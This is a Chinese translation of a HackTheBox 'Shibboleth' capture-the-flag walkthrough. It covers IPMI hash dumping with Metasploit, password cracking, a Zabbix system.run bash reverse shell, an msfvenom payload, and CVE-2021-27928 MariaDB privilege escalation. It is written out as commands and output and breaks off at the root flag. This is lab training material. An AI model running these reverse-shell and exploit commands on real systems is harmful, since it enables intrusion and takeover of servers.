<html>
<head>
<title>Shibboleth from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的Shibboleth详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/shibboleth-from-hackthebox-detailed-walkthrough-97c7055cb94d?source=collection_archive---------1-----------------------#2022-04-25">https://infosecwriteups.com/shibboleth-from-hackthebox-detailed-walkthrough-97c7055cb94d?source=collection_archive---------1-----------------------#2022-04-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d4cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="1fcb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/e09b9aab373db68a389b6f531ec82996.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*LnwQ_NwOM97eo162.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">HackTheBox的Shibboleth</figcaption></figure><p id="982b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Shibboleth是HackTheBox上的一台中型机器。在一些初始枚举之后，我们找到了一个安装Zabbix的登录页面。使用Metasploit，我们转储容易被JohnTheRipper破解的用户哈希。通过访问Zabbix仪表板，我们发现它容易受到远程代码执行的攻击。我们用它来获得一个外壳，在这个外壳上我们发现了一个易受攻击的MariaDB版本。我们使用一个公共漏洞来上传一个有效载荷，这给了我们一个根外壳来完成这个盒子。</p><p id="eb34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是查点技术和研究公共利用的知识。学到的技能是使用Metasploit进行开发和有效负载创建。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.com/home/machines/profile/410" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">Shibboleth —破解盒子::渗透测试实验室</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="5cd9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="7eb9" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="cd06" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.124 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)<br/><br/>┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# nmap -p$ports -sC -sV -oA shibboleth 10.10.11.124<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 11:47 GMT<br/>Nmap scan report for 10.10.11.124<br/>Host is up (0.026s latency).<br/><br/>PORT   STATE SERVICE VERSION<br/>80/tcp open  http    Apache httpd 2.4.41<br/>|_http-title: Did not follow redirect to http://shibboleth.htb/<br/>|_http-server-header: Apache/2.4.41 (Ubuntu)<br/>Service Info: Host: shibboleth.htb</span></pre><p id="a605" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有意思。我们在这个机器上只有一个使用TCP的开放端口，如果我们在这里没有任何进展，那么记得再次扫描UDP。是的，我以前也曾被这个问题困扰过，所以现在它是这个过程的一部分！</p><p id="51ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到了主机名，所以在开始之前，让我们将它添加到hosts文件中:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="9e76" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# echo "10.10.11.124 shibboleth.htb" &gt;&gt; /etc/hosts</span></pre><p id="c403" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们来看看80端口的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/02755c05f00764f58ae2af7fb3063708.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/0*3REhjhVvJ6scsu8K.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">端口80上的网站</figcaption></figure><p id="3dbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾网站，它主要是一个模板，没有任何真正的兴趣。唯一值得注意的是在页脚:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/a712f9c1f7191cbae609e01bb9e0f3fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:948/format:webp/0*3Clmh1y33AcuSdwk.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">网页页脚</figcaption></figure><h1 id="7ed9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Gobuster</h1><p id="bc1c" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">没什么可说的，我尝试了子域枚举:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="nf ng di nh bf ni"><div class="gh gi ne"><img src="../Images/1acafac1d1db5a3b18d86f2c0e07483b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D750DV-cXchU8YKsxeA0tA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">搜索子域的Gobuster</figcaption></figure><p id="bd9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我应该切换到fuff或wfuzz进行vhost搜索，反正有一个很长的列表要浏览，所以只需grep我们感兴趣的状态代码:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a7d4" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# cat results.txt | grep "Status: 20"<br/>Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]<br/>Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]<br/>Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]</span></pre><p id="bd30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们发现了三个子域名，其中一个叫做zabbix，在网页页脚提到过。让我们将它们都添加到我们的hosts文件中:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="426a" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# echo "10.10.11.124 monitoring.shibboleth.htb zabbix.shibboleth.htb monitor.shibboleth.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="bbe9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Zabbix登录页面</h1><p id="8123" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">在浏览器中，我们发现这三个页面都指向同一个登录页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/418fff6b1dc981b365e9be78282044f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:796/format:webp/0*zbK64ak4MsGK6myj.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Zabbix登录页面</figcaption></figure><p id="8abf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我以前没听说过Zabbix。环顾四周，发现官方网站<a class="ae nk" href="https://www.zabbix.com/" rel="noopener ugc nofollow" target="_blank">在这里</a>，维基页面<a class="ae nk" href="https://en.wikipedia.org/wiki/Zabbix" rel="noopener ugc nofollow" target="_blank">在这里</a>，它描述为:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="3c14" class="mx km iq mt b gy my mz l na nb">Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines (VMs) and cloud services.</span></pre><h1 id="c15c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">IPMI调查</h1><p id="224b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">默认凭据在登录页面上不起作用，因此回到nmap:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="cf76" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# nmap -sU --min-rate=1000 -T4 10.10.11.124<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 12:36 GMT<br/>Nmap scan report for shibboleth.htb (10.10.11.124)<br/>Host is up (0.026s latency).<br/>Not shown: 986 open|filtered udp ports (no-response)<br/>PORT      STATE  SERVICE<br/>17/udp    closed qotd<br/>623/udp   open   asf-rmcp<br/>&lt;SNIP&gt;<br/>Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds</span></pre><p id="4c77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如所料，有一个UDP端口开放，623是一个众所周知的IPMI管理。如果你不熟悉的话，这里有一个很好的描述<a class="ae nk" href="https://www.zenlayer.com/blog/what-is-ipmi/" rel="noopener ugc nofollow" target="_blank"/>。看看HackTricks，有一篇文章<a class="ae nk" href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi" rel="noopener ugc nofollow" target="_blank">我们可以用它来枚举端口。</a></p><p id="18fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先让我们看看IPMI运行的是什么版本:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="3332" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# nmap -sU --script ipmi-version -p 623 shibboleth.htb<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 17:10 GMT<br/>Nmap scan report for shibboleth.htb (10.10.11.124)<br/>Host is up (0.021s latency).<br/><br/>PORT    STATE SERVICE<br/>623/udp open  asf-rmcp<br/>| ipmi-version:<br/>|   Version:<br/>|     IPMI-2.0<br/>|   UserAuth: password, md5, md2, null<br/>|   PassAuth: auth_msg, auth_user, non_null_user<br/>|_  Level: 1.5, 2.0</span></pre><p id="9d96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">IPMI的第二版有一些严重的安全问题，<a class="ae nk" href="http://fish2.com/ipmi/remote-pw-cracking.html" rel="noopener ugc nofollow" target="_blank">这个</a>是一个很好的读物，它解释了我们可以绕过认证。</p><p id="7d16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过使用<a class="ae nk" href="https://github.com/alexoslabs/ipmitest" rel="noopener ugc nofollow" target="_blank">这个</a>脚本来检查密码0漏洞:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="nf ng di nh bf ni"><div class="gh gi nl"><img src="../Images/9509a83291026c4f578d6dee4312ee9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S6tKEZfCcSd4v_9WRszx_A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">下载ipmitest脚本</figcaption></figure><p id="e555" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在对着盒子运行:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="nf ng di nh bf ni"><div class="gh gi nm"><img src="../Images/3e9009d709b8c76dae99ba913a12554f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gD_wNxRRN4Awk-slpOR5pQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">IPMITest正在对机器运行</figcaption></figure><p id="415a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确认主机易受攻击后，我们可以求助于<a class="ae nk" href="https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/" rel="noopener ugc nofollow" target="_blank">这篇关于使用Metasploit转储用户哈希的</a> Rapid7帖子:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="f132" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# msfdb start<br/>[+] Starting database<br/><br/>┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# msfconsole -nqx "use scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.11.124; set RPORT 623; set OUTPUT_JOHN_FILE out.john; exploit"<br/>RHOSTS =&gt; 10.10.11.124<br/>RPORT =&gt; 623<br/>OUTPUT_JOHN_FILE =&gt; out.john<br/>[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:86466b970223000067982d8966a40875c1ece9a0799cef734640ca4dfe646e76990b8a3b7e28ac51a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f3006eb7f7bf3fcdf9a253ba31144abb49b65e77<br/>[*] Scanned 1 of 1 hosts (100% complete)<br/>[*] Auxiliary module execution completed</span></pre><h1 id="27b8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JohnTheRipper</h1><p id="4823" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们有管理员散列并将其输出为JohnTheRipper格式，让我们来破解它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="3d0f" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# john --wordlist=/usr/share/wordlists/rockyou.txt out.john<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>ilovepumkinpie1  (10.10.11.124 Administrator)<br/>1g 0:00:00:01 DONE (2021-11-28 17:43) 0.8928g/s 6670Kp/s 6670Kc/s 6670KC/s in_199..iargxe<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed.</span></pre><h1 id="b81f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Zabbix仪表板</h1><p id="8528" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">几秒钟后我们就有了密码。现在我们可以登录到Zabbix仪表板:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="nf ng di nh bf ni"><div class="gh gi nn"><img src="../Images/e4b2338e6b57a232ae9e92b95bf6c4e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*L3_J5LYyEYq4gYAN.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Zabbix仪表板</figcaption></figure><p id="3987" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾仪表板，没有太多的设置，但搜索漏洞时，我发现了一个简单的方法来执行Zabbix文档中的命令<a class="ae nk" href="https://www.zabbix.com/documentation/current/manual/config/items/itemtypes/zabbix_agent" rel="noopener ugc nofollow" target="_blank">这里</a>:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="5b3f" class="mx km iq mt b gy my mz l na nb">system.run[command,&lt;mode&gt;]<br/>Run specified command on the host.<br/>command - command for execution<br/>mode - possible values:<br/>wait - wait end of execution (default),<br/>nowait - do not wait<br/><br/>Example:<br/>⇒ system.run[ls -l /] → detailed file list of root directory.</span></pre><p id="3466" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了利用这一点，我们需要向服务器添加一个新项目，并安排它的运行时间。首先单击配置，然后单击主机，然后单击项目:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/1b7e5f8d6c3d00b8a5aa63057bf6801a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1072/format:webp/0*zPAInT0ZjDwzG-BR.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Zabbix主机</figcaption></figure><h1 id="ff7e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><p id="8209" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">单击最右边的Create Item按钮，然后使用这个简单的bash reverse shell作为我们将要运行的命令:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="2db5" class="mx km iq mt b gy my mz l na nb">system.run[/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.62/1337 0&gt;&amp;1',nowait]</span></pre><p id="251a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">给你的物品起个名字，然后把我们的命令粘贴到关键字段:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="nf ng di nh bf ni"><div class="gh gi np"><img src="../Images/3780ddd8c0963f8450c40d335434bbf0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*UJDk6kZtV15KUV_v.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Zabbix管理控制台中的项目名称</figcaption></figure><p id="f8b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在启动netcat监听并等待shell连接:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="55e0" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.62] from (UNKNOWN) [10.10.11.124] 44692<br/>bash: cannot set terminal process group (1132): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>zabbix@shibboleth:/$</span></pre><p id="303e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先让我们得到一个合适的外壳:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="89c0" class="mx km iq mt b gy my mz l na nb">zabbix@shibboleth:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>zabbix@shibboleth:/$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/>zabbix@shibboleth:/$ stty rows 61 cols 237</span></pre><p id="4c76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看看我们是谁:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="09fc" class="mx km iq mt b gy my mz l na nb">zabbix@shibboleth:/$ whoami<br/>zabbix<br/>zabbix@shibboleth:/$ id<br/>uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)<br/>zabbix@shibboleth:/$ cat /etc/passwd | grep zabbix<br/>zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin</span></pre><p id="2f8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们是作为无法登录的服务帐户连接的。在/home中，我们看到只有一个用户:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0646" class="mx km iq mt b gy my mz l na nb">zabbix@shibboleth:/$ ls -ls /home<br/>4 drwxr-xr-x 4 ipmi-svc ipmi-svc 4096 Nov 28 16:35 ipmi-svc</span></pre><h1 id="95ef" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="9c18" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">尝试使用我们用来登录仪表板的相同密码:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="b166" class="mx km iq mt b gy my mz l na nb">zabbix@shibboleth:/$ su ipmi-svc<br/>Password:<br/>ipmi-svc@shibboleth:/$</span></pre><p id="2033" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以获取用户标志:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="804e" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:~$ cat user.txt<br/>e90fa80a610ef639e26119e93a143a50</span></pre><p id="57c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我发现mysql作为root在机器上运行:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="2bac" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:~$ ps -ef | grep mysql<br/>root       92419       1  0 19:10 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe<br/>root       92542   92419  0 19:10 ?        00:00:52 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock<br/>root       92543   92419  0 19:10 ?        00:00:00 logger -t mysqld -p daemon error<br/>ipmi-svc  124084  122951  0 22:07 pts/0    00:00:00 grep --color=auto mysql</span></pre><p id="6984" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还发现它在本地监听默认端口3306:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a313" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:~$ netstat -ano | grep 3306<br/>tcp    0   0 127.0.0.1:3306   0.0.0.0:*   LISTEN  off (0.00/0/0)</span></pre><p id="c3c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾四周，我在/etc中找到了zabbix安装，其中有一个包含凭证的服务器配置文件:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="84df" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf | grep 'DBName\|DBUser\|DBPassword'<br/>### Option: DBName<br/># DBName=<br/>DBName=zabbix<br/>### Option: DBUser<br/># DBUser=<br/>DBUser=zabbix<br/>### Option: DBPassword<br/>DBPassword=bloooarskybluh</span></pre><h1 id="caf9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">关系型数据库</h1><p id="0f09" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们现在可以登录mysql了:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="8a32" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:~$ mysql -u zabbix -p<br/>Enter password:<br/>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br/>Your MariaDB connection id is 2172<br/>Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04<br/>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br/>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.<br/>MariaDB [(none)]&gt;</span></pre><p id="b303" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到我们有MariaDB，它是mysql的一个分支，更多信息<a class="ae nk" href="https://en.wikipedia.org/wiki/MariaDB" rel="noopener ugc nofollow" target="_blank">在这里</a>。搜索MariaDB的10.3.25版本，我们发现它来自2020年，存在命令执行漏洞。<a class="ae nk" href="https://www.cvedetails.com/cve/CVE-2021-27928" rel="noopener ugc nofollow" target="_blank">CVE-2021–27928</a>容易开采。<a class="ae nk" href="https://github.com/Al1ex/CVE-2021-27928" rel="noopener ugc nofollow" target="_blank">这个</a> GitHub repo和<a class="ae nk" href="https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html" rel="noopener ugc nofollow" target="_blank">这个</a>帖子有我们需要利用的所有信息。</p><h1 id="5ec2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">MSF毒液有效载荷</h1><p id="a317" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">首先用MSFVenom创建我们的漏洞:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="929c" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.62 LPORT=4444 -f elf-so -o pencer.so<br/>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br/>[-] No arch selected, selecting arch: x64 from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 74 bytes<br/>Final size of elf-so file: 476 bytes<br/>Saved as: pencer.so</span></pre><p id="7b51" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Kali上启动一个网络服务器，这样我们就可以获取文件:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="5cc1" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/shibboleth]<br/>└─# python3 -m http.server 80<br/>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></pre><p id="e1f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">拉过来:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="9736" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:/dev/shm$ wget http://10.10.14.62/pencer.so<br/>--2021-11-28 22:47:14--  http://10.10.14.62/pencer.so<br/>Connecting to 10.10.14.62:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 476 [application/octet-stream]<br/>Saving to: ‘pencer.so’<br/>pencer.so          100%[===========&gt;]     476  --.-KB/s    in 0s<br/>2021-11-28 22:47:14 (81.9 MB/s) - ‘pencer.so’ saved [476/476]</span></pre><h1 id="7bb0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">权限提升</h1><p id="97c8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">在Kali上启动netcat监听器，然后使用mysql在机器上执行漏洞利用:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="1478" class="mx km iq mt b gy my mz l na nb">ipmi-svc@shibboleth:/dev/shm$ mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/dev/shm/CVE-2021-27928.so";'<br/>Enter password:<br/>ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span></pre><h1 id="cf6f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="ee18" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">切换回Kali，看看我们有一个根壳。让我们抓住旗子:</p><pre 